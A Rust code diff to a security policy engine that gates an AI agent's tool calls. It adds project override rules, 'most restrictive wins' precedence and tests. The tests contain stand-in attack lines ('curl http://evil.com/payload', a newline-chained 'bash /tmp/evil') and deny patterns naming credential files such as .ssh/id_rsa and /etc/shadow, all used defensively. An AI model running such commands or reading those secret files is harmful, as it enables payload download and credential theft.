@@ -13,7 +13,7 @@ static AUTHORIZATION_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();
 
 fn get_protected_paths_re() -> &'static Regex {
     PROTECTED_PATHS_RE.get_or_init(|| {
-        Regex::new(r"(?i)(hooks/laya-pretool-hook\.js|laya_runtime/|laya_config\.json|laya_rules\.json|\.laya/|\.claude/settings\.json|\.gemini/)").unwrap()
+        Regex::new(r"(?i)(hooks/laya-pretool-hook\.js|laya_runtime/|laya_config\.json|laya_rules\.json|laya.*\.onnx|\.laya/|\.claude/settings\.json|\.gemini/|\.config/laya/|\.local/state/laya/|laya\s+policy\s+trust)").unwrap()
     })
 }
 
@@ -128,6 +128,9 @@ pub fn check_tier0_invariants(tool: &str, args: &Value) -> Option<(&'static str,
         .or_else(|| args.get("path"))
         .or_else(|| args.get("file_path"))
         .or_else(|| args.get("TargetFile"))
+        .or_else(|| args.get("AbsolutePath"))
+        .or_else(|| args.get("file"))
+        .or_else(|| args.get("filename"))
         .and_then(|v| v.as_str())
         .unwrap_or("");
 
@@ -175,11 +178,11 @@ pub struct RawRule {
     pub name: Option<String>,
     pub action: String,
     pub tool: Option<String>,
-    #[serde(rename = "toolPattern")]
+    #[serde(rename = "toolPattern", alias = "tool_pattern")]
     pub tool_pattern: Option<String>,
-    #[serde(rename = "commandPattern")]
+    #[serde(rename = "commandPattern", alias = "command_pattern")]
     pub command_pattern: Option<String>,
-    #[serde(rename = "pathPattern")]
+    #[serde(rename = "pathPattern", alias = "path_pattern")]
     pub path_pattern: Option<String>,
 }
 
@@ -197,6 +200,68 @@ pub struct CompiledRule {
     pub path_re: Option<Regex>,
 }
 
+fn compile_rule(r: &RawRule, is_trusted: bool) -> Result<Option<CompiledRule>, String> {
+    let name = r.name.as_ref().or(r.id.as_ref()).cloned().unwrap_or_else(|| "unnamed-rule".to_string());
+    let action = r.action.trim().to_uppercase();
+    if action != "ALLOW" && action != "DENY" && action != "REQUIRE_AUTHORIZATION" {
+        return Err(format!(
+            "Unsupported action '{}' in rule '{}': expected ALLOW, DENY, or REQUIRE_AUTHORIZATION",
+            r.action, name
+        ));
+    }
+
+    if action == "ALLOW" && !is_trusted {
+        return Err(format!(
+            "Rejected project ALLOW rule '{}': Untrusted repository cannot add allow rules without 'laya policy trust'.",
+            name
+        ));
+    }
+
+    let tool_pat = r.tool.as_ref().or(r.tool_pattern.as_ref());
+    let tool_re = match tool_pat {
+        Some(p) => match Regex::new(&format!("(?i){}", p)) {
+            Ok(re) => Some(re),
+            Err(e) => return Err(format!("Invalid tool regex pattern '{}' in rule '{}': {}", p, name, e)),
+        },
+        None => None,
+    };
+
+    let cmd_re = match r.command_pattern.as_ref() {
+        Some(p) => match Regex::new(p) {
+            Ok(re) => Some(re),
+            Err(e) => return Err(format!("Invalid command regex pattern '{}' in rule '{}': {}", p, name, e)),
+        },
+        None => None,
+    };
+
+    let path_re = match r.path_pattern.as_ref() {
+        Some(p) => match Regex::new(p) {
+            Ok(re) => Some(re),
+            Err(e) => return Err(format!("Invalid path regex pattern '{}' in rule '{}': {}", p, name, e)),
+        },
+        None => None,
+    };
+
+    if tool_re.is_none() && cmd_re.is_none() && path_re.is_none() {
+        return Err(format!(
+            "Rule '{}' declares no tool, command, or path matcher and was ignored",
+            name
+        ));
+    }
+
+    if action == "ALLOW" && cmd_re.is_none() && path_re.is_none() {
+        return Ok(None);
+    }
+
+    Ok(Some(CompiledRule {
+        name,
+        action,
+        tool_re,
+        cmd_re,
+        path_re,
+    }))
+}
+
 #[derive(Debug, Clone, Default)]
 pub struct PolicyEngine {
     rules: Vec<CompiledRule>,
@@ -208,45 +273,102 @@ impl PolicyEngine {
     }
 
     pub fn load_from_file<P: AsRef<Path>>(&mut self, path: P) -> crate::error::Result<()> {
-        let content = fs::read_to_string(path)?;
-        let raw_file: RawRuleFile = match serde_json::from_str(&content) {
-            Ok(rf) => rf,
-            Err(_) => {
-                let rules: Vec<RawRule> = serde_json::from_str(&content)?;
-                RawRuleFile { rules: Some(rules) }
+        let p = path.as_ref();
+        let content = fs::read_to_string(p)?;
+        let raw_file: RawRuleFile = if p.extension().and_then(|s| s.to_str()) == Some("toml") {
+            toml::from_str(&content).map_err(|e| crate::error::LayaError::Config(format!("Failed to parse TOML policy {}: {}", p.display(), e)))?
+        } else {
+            match serde_json::from_str(&content) {
+                Ok(rf) => rf,
+                Err(_) => match toml::from_str(&content) {
+                    Ok(rf) => rf,
+                    Err(_) => {
+                        let rules: Vec<RawRule> = serde_json::from_str(&content)?;
+                        RawRuleFile { rules: Some(rules) }
+                    }
+                }
             }
         };
 
         let mut compiled = Vec::new();
         if let Some(rules) = raw_file.rules {
-            for r in rules {
-                let action = r.action.trim().to_uppercase();
-                if action != "ALLOW" && action != "DENY" && action != "REQUIRE_AUTHORIZATION" {
-                    continue;
+            for r in &rules {
+                match compile_rule(r, true) {
+                    Ok(Some(rule)) => compiled.push(rule),
+                    Ok(None) => {}
+                    Err(e) => {
+                        eprintln!("[LAYA POLICY WARNING] {}", e);
+                    }
                 }
-
-                let tool_pat = r.tool.or(r.tool_pattern);
-                let tool_re = tool_pat.and_then(|p| Regex::new(&format!("(?i){}", p)).ok());
-                let cmd_re = r.command_pattern.and_then(|p| Regex::new(&p).ok());
-                let path_re = r.path_pattern.and_then(|p| Regex::new(&p).ok());
-
-                if action == "ALLOW" && cmd_re.is_none() && path_re.is_none() {
-                    continue;
-                }
-
-                let name = r.name.or(r.id).unwrap_or_else(|| "unnamed-rule".to_string());
-                compiled.push(CompiledRule {
-                    name,
-                    action,
-                    tool_re,
-                    cmd_re,
-                    path_re,
-                });
             }
         }
 
         self.rules = compiled;
         Ok(())
+    }
+
+    /// Merges project-specific policy rules from .laya/policy.toml into the engine.
+    ///
+    /// Monotonicity guarantee:
+    /// - An untrusted repository CANNOT relax global security rules or add unverified ALLOW rules.
+    /// - DENY and REQUIRE_AUTHORIZATION rules from the project are prepended to tighten policy.
+    /// - ALLOW rules from the project are REJECTED unless `is_trusted` is true (via 'laya policy trust').
+    ///
+    /// Merges project-specific policy rules from a string into the engine.
+    pub fn load_project_override_str(&mut self, content: &str, is_toml: bool, is_trusted: bool) -> crate::error::Result<Vec<String>> {
+        let raw_file: RawRuleFile = if is_toml {
+            toml::from_str(content).map_err(|e| crate::error::LayaError::Config(format!("Failed to parse project TOML policy: {}", e)))?
+        } else {
+            match serde_json::from_str(content) {
+                Ok(rf) => rf,
+                Err(_) => {
+                    let rules: Vec<RawRule> = serde_json::from_str(content)?;
+                    RawRuleFile { rules: Some(rules) }
+                }
+            }
+        };
+
+        let mut warnings = Vec::new();
+        let mut project_rules = Vec::new();
+
+        if let Some(rules) = raw_file.rules {
+            for r in &rules {
+                match compile_rule(r, is_trusted) {
+                    Ok(Some(rule)) => project_rules.push(rule),
+                    Ok(None) => {}
+                    Err(warn) => warnings.push(warn),
+                }
+            }
+        }
+
+        // Prepend project rules so project-specific tightening evaluates before global rules
+        project_rules.append(&mut self.rules);
+        self.rules = project_rules;
+
+        Ok(warnings)
+    }
+
+    /// Merges project-specific policy rules from .laya/policy.toml into the engine.
+    ///
+    /// Monotonicity guarantee:
+    /// - An untrusted repository CANNOT relax global security rules or add unverified ALLOW rules.
+    /// - DENY and REQUIRE_AUTHORIZATION rules from the project are prepended to tighten policy.
+    /// - ALLOW rules from the project are REJECTED unless `is_trusted` is true (via 'laya policy trust').
+    ///
+    /// Returns a list of rejected rule warnings (if any).
+    pub fn load_project_override<P: AsRef<Path>>(&mut self, path: P, is_trusted: bool) -> crate::error::Result<Vec<String>> {
+        let p = path.as_ref();
+        if !p.exists() {
+            return Ok(Vec::new());
+        }
+
+        let content = fs::read_to_string(p)?;
+        let is_toml = p.extension().and_then(|s| s.to_str()) == Some("toml");
+        self.load_project_override_str(&content, is_toml, is_trusted)
+    }
+
+    pub fn rules_count(&self) -> usize {
+        self.rules.len()
     }
 
     pub fn evaluate(&self, tool: &str, args: &Value, workspace_root: Option<&Path>) -> Option<(&str, &str)> {
@@ -264,6 +386,9 @@ impl PolicyEngine {
             .or_else(|| args.get("path"))
             .or_else(|| args.get("file_path"))
             .or_else(|| args.get("TargetFile"))
+            .or_else(|| args.get("AbsolutePath"))
+            .or_else(|| args.get("file"))
+            .or_else(|| args.get("filename"))
             .and_then(|v| v.as_str())
             .unwrap_or("");
 
@@ -312,6 +437,9 @@ impl PolicyEngine {
             }
         }
 
+        let mut best_match: Option<(&str, &str)> = None;
+        let mut best_rank = 0;
+
         for r in &self.rules {
             if let Some(re) = &r.tool_re {
                 if !re.is_match(tool) {
@@ -345,10 +473,23 @@ impl PolicyEngine {
                 }
             }
 
-            return Some((&r.action, &r.name));
+            let rank = match r.action.as_str() {
+                "DENY" => 3,
+                "REQUIRE_AUTHORIZATION" => 2,
+                "ALLOW" => 1,
+                _ => 0,
+            };
+
+            if rank > best_rank {
+                best_rank = rank;
+                best_match = Some((&r.action, &r.name));
+                if rank == 3 {
+                    break;
+                }
+            }
         }
 
-        None
+        best_match
     }
 }
 
@@ -460,4 +601,243 @@ mod tests {
             assert!(res.is_none(), "Read operations should not trigger self-protection invariant");
         }
     }
+
+    #[test]
+    fn test_monotonicity_untrusted_project_cannot_add_allow() {
+        let mut engine = PolicyEngine::new();
+
+        // Write temporary toml policy
+        let temp_dir = std::env::temp_dir().join(format!("laya_test_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
+        std::fs::create_dir_all(&temp_dir).unwrap();
+        let policy_file = temp_dir.join("policy.toml");
+
+        let toml_content = r#"
+[[rules]]
+name = "malicious_allow_bypass"
+action = "ALLOW"
+commandPattern = "curl.*evil\\.com"
+
+[[rules]]
+name = "strict_project_deny"
+action = "DENY"
+commandPattern = "npm publish"
+"#;
+        std::fs::write(&policy_file, toml_content).unwrap();
+
+        // Load as untrusted
+        let warnings = engine.load_project_override(&policy_file, false).unwrap();
+        assert_eq!(warnings.len(), 1, "Expected warning for rejected ALLOW rule");
+        assert!(warnings[0].contains("Rejected project ALLOW rule"));
+
+        // Verify that the ALLOW rule was NOT installed
+        let allow_req = json!({ "CommandLine": "curl http://evil.com/payload" });
+        assert_eq!(engine.evaluate("run_command", &allow_req, None), None);
+
+        // Verify that the DENY rule WAS installed
+        let deny_req = json!({ "CommandLine": "npm publish" });
+        assert_eq!(engine.evaluate("run_command", &deny_req, None), Some(("DENY", "strict_project_deny")));
+
+        let _ = std::fs::remove_dir_all(&temp_dir);
+    }
+
+    #[test]
+    fn test_rule_precedence_most_restrictive_wins() {
+        let mut engine = PolicyEngine::new();
+
+        let temp_dir = std::env::temp_dir().join(format!("laya_test_prec_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
+        std::fs::create_dir_all(&temp_dir).unwrap();
+        let global_policy = temp_dir.join("global.toml");
+        let project_policy = temp_dir.join("project.toml");
+
+        // Global has strict DENY on force push
+        let global_toml = r#"
+[[rules]]
+name = "global_deny_force_push"
+action = "DENY"
+commandPattern = "git push.*--force"
+
+[[rules]]
+name = "global_allow_echo"
+action = "ALLOW"
+commandPattern = "^echo .*"
+"#;
+        std::fs::write(&global_policy, global_toml).unwrap();
+        engine.load_from_file(&global_policy).unwrap();
+
+        // Project has a looser rule requiring authorization on git push
+        // and a tighter rule requiring authorization on echo
+        let project_toml = r#"
+[[rules]]
+name = "project_require_auth_git"
+action = "REQUIRE_AUTHORIZATION"
+commandPattern = "^git push.*"
+
+[[rules]]
+name = "project_tighten_echo"
+action = "REQUIRE_AUTHORIZATION"
+commandPattern = "^echo sensitive.*"
+"#;
+        std::fs::write(&project_policy, project_toml).unwrap();
+        engine.load_project_override(&project_policy, false).unwrap();
+
+        // 1. git push --force: project rule matched REQUIRE_AUTHORIZATION, but global matched DENY -> DENY wins
+        let force_push = json!({ "CommandLine": "git push origin main --force" });
+        assert_eq!(engine.evaluate("run_command", &force_push, None), Some(("DENY", "global_deny_force_push")));
+
+        // 2. git push origin main: only project matched REQUIRE_AUTHORIZATION -> REQUIRE_AUTHORIZATION wins
+        let normal_push = json!({ "CommandLine": "git push origin main" });
+        assert_eq!(engine.evaluate("run_command", &normal_push, None), Some(("REQUIRE_AUTHORIZATION", "project_require_auth_git")));
+
+        // 3. echo hello: global ALLOW matched, project didn't match -> ALLOW wins
+        let echo_hello = json!({ "CommandLine": "echo hello world" });
+        assert_eq!(engine.evaluate("run_command", &echo_hello, None), Some(("ALLOW", "global_allow_echo")));
+
+        // 4. echo sensitive token: global ALLOW matched, but project tightened to REQUIRE_AUTHORIZATION -> REQUIRE_AUTHORIZATION wins
+        let echo_sens = json!({ "CommandLine": "echo sensitive token" });
+        assert_eq!(engine.evaluate("run_command", &echo_sens, None), Some(("REQUIRE_AUTHORIZATION", "project_tighten_echo")));
+
+        let _ = std::fs::remove_dir_all(&temp_dir);
+    }
+
+    #[test]
+    fn test_invalid_regex_does_not_become_match_all_rule() {
+        let mut engine = PolicyEngine::new();
+        let temp_dir = std::env::temp_dir().join(format!("laya_test_regex_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
+        std::fs::create_dir_all(&temp_dir).unwrap();
+        let policy_file = temp_dir.join("policy.toml");
+
+        // Rule with invalid regex pattern "[invalid(regex"
+        let toml_content = r#"
+[[rules]]
+name = "broken_deny_rule"
+action = "DENY"
+commandPattern = "[invalid(regex"
+"#;
+        std::fs::write(&policy_file, toml_content).unwrap();
+
+        // Loading should report warning and NOT install a match-all DENY rule
+        let warnings = engine.load_project_override(&policy_file, false).unwrap();
+        assert_eq!(warnings.len(), 1);
+        assert!(warnings[0].contains("Invalid command regex pattern"));
+
+        // Safe command should NOT be denied by the broken rule
+        let safe_cmd = json!({ "CommandLine": "ls -la" });
+        assert_eq!(engine.evaluate("run_command", &safe_cmd, None), None);
+
+        let _ = std::fs::remove_dir_all(&temp_dir);
+    }
+
+    #[test]
+    fn test_git_and_path_security_rules() {
+        let mut engine = PolicyEngine::new();
+        let temp_dir = std::env::temp_dir().join(format!("laya_test_git_rules_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
+        std::fs::create_dir_all(&temp_dir).unwrap();
+        let policy_file = temp_dir.join("global.toml");
+
+        let policy_content = r#"
+version = "1.0"
+name = "test-rules"
+
+[[rules]]
+name = "allow-git-queries"
+action = "ALLOW"
+commandPattern = "^git[ \\t]+(status|diff|log|show)([ \\t]+[^;&|`$()<>\r\n]*)?$"
+
+[[rules]]
+name = "allow-git-branch-queries"
+action = "ALLOW"
+commandPattern = "^git[ \\t]+branch([ \\t]+(-[alr]+|--list|--show-current|--all|--remotes))?$"
+
+[[rules]]
+name = "allow-workspace-reads"
+action = "ALLOW"
+toolPattern = "^(view_file|read_file|Read)$"
+pathPattern = ".*"
+
+[[rules]]
+name = "block-git-sensitive-paths"
+action = "DENY"
+commandPattern = "^git\\s+.*(\\.env\\.production|prod\\.secrets|id_rsa|id_ed25519|\\.ssh/|\\.aws/|/etc/shadow|/etc/passwd).*"
+
+[[rules]]
+name = "block-git-file-overwrite"
+action = "DENY"
+commandPattern = "^git\\s+.*(--output|-o\\s).*"
+
+[[rules]]
+name = "require-auth-git-diff-external"
+action = "REQUIRE_AUTHORIZATION"
+commandPattern = "^git[ \\t]+diff\\b.*(--no-index|[ \\t][/~]|[ \\t]\\.\\./).*"
+
+[[rules]]
+name = "block-git-branch-mutation"
+action = "REQUIRE_AUTHORIZATION"
+commandPattern = "^git\\s+branch\\s+.*(-[dDfmM]|--delete|--set-upstream-to).*"
+
+[[rules]]
+name = "protect-sensitive-env"
+action = "DENY"
+pathPattern = ".*(\\.env\\.production|prod\\.secrets|id_rsa|id_ed25519|\\.ssh/|\\.aws/|credentials).*"
+"#;
+        std::fs::write(&policy_file, policy_content).unwrap();
+        engine.load_from_file(&policy_file).unwrap();
+
+        // 1. Safe git status is ALLOWED
+        let git_status = json!({ "CommandLine": "git status" });
+        assert_eq!(engine.evaluate("run_command", &git_status, None), Some(("ALLOW", "allow-git-queries")));
+
+        // 2. Safe git branch listing is ALLOWED
+        let git_branch_list = json!({ "CommandLine": "git branch -a" });
+        assert_eq!(engine.evaluate("run_command", &git_branch_list, None), Some(("ALLOW", "allow-git-branch-queries")));
+
+        // 3. Destructive git branch deletion is NOT allowed (escalates to REQUIRE_AUTHORIZATION)
+        let git_branch_del = json!({ "CommandLine": "git branch -D evil-feature" });
+        assert_eq!(engine.evaluate("run_command", &git_branch_del, None), Some(("REQUIRE_AUTHORIZATION", "block-git-branch-mutation")));
+
+        // 4. Git diff with --output is DENIED
+        let git_diff_out = json!({ "CommandLine": "git diff --output=/tmp/overwrite.sh" });
+        assert_eq!(engine.evaluate("run_command", &git_diff_out, None), Some(("DENY", "block-git-file-overwrite")));
+
+        // 5. Sensitive file read (.env.production) is DENIED
+        let read_env = json!({ "AbsolutePath": "/project/.env.production" });
+        assert_eq!(engine.evaluate("view_file", &read_env, None), Some(("DENY", "protect-sensitive-env")));
+
+        // 6. Sensitive SSH key read is DENIED
+        let read_ssh = json!({ "file_path": "/home/user/.ssh/id_rsa" });
+        assert_eq!(engine.evaluate("Read", &read_ssh, None), Some(("DENY", "protect-sensitive-env")));
+
+        // 7. Safe workspace read is ALLOWED
+        let safe_read = json!({ "filepath": "README.md" });
+        assert_eq!(engine.evaluate("view_file", &safe_read, Some(&temp_dir)), Some(("ALLOW", "allow-workspace-reads")));
+
+        // 8. Newline command chaining bypass attempt is NOT ALLOWED
+        let newline_cmd = json!({ "CommandLine": "git status\nbash /tmp/evil" });
+        assert_ne!(engine.evaluate("run_command", &newline_cmd, None), Some(("ALLOW", "allow-git-queries")));
+
+        // 9. Unsupported action returns an error and warning
+        let bad_action_raw = RawRule {
+            id: Some("bad-rule".to_string()),
+            name: None,
+            action: "BLOCK".to_string(),
+            tool: None,
+            tool_pattern: None,
+            command_pattern: Some("echo hi".to_string()),
+            path_pattern: None,
+        };
+        let compile_res = compile_rule(&bad_action_raw, true);
+        assert!(compile_res.is_err());
+        assert!(compile_res.unwrap_err().contains("Unsupported action 'BLOCK'"));
+
+        // 10. External git diff with --no-index requires authorization
+        let ext_diff = json!({ "CommandLine": "git diff --no-index /tmp/a /tmp/b" });
+        assert_eq!(engine.evaluate("run_command", &ext_diff, None), Some(("REQUIRE_AUTHORIZATION", "require-auth-git-diff-external")));
+
+        // 11. Git diff reading sensitive files (e.g. id_rsa) is DENIED
+        let sens_diff = json!({ "CommandLine": "git diff --no-index /dev/null /home/user/.ssh/id_rsa" });
+        assert_eq!(engine.evaluate("run_command", &sens_diff, None), Some(("DENY", "block-git-sensitive-paths")));
+
+        let _ = std::fs::remove_dir_all(&temp_dir);
+    }
 }
+
+
